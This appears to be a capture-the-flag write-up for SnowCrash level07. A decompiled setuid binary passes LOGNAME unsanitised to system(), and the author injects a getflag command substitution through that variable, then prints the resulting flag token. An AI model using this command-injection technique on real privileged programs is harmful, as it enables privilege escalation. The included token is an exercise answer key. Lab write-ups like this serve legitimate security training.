main()
{
0804851d  int32_t eax = getegid()
08048526  int32_t eax_1 = geteuid()
08048546  setresgid(eax, eax, eax)
08048562  setresuid(eax_1, eax_1, eax_1)
08048567  int32_t var_1c = 0
0804858e  asprintf(&var_1c, 0x8048688, getenv(0x8048680))  {"LOGNAME"}  {"/bin/echo %s "}
080485a0  return system(var_1c)
}

decompiling the binary with binary ninja, we get the upper code
it shows that the program prints the variable LOGNAME

level07@SnowCrash:~$ export LOGNAME=$\(getflag\)
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

